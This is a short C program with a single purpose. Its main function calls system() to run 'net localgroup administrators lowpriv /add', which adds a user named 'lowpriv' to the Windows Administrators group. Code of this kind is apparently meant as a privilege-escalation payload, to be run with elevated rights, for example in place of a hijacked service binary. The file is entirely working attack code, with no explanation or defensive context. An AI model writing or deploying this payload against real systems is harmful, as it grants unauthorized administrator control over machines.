#include <stdlib.h>
int main ()
{
	int i;
	i=system ("net localgroup administrators lowpriv /add");
	return 0;
}
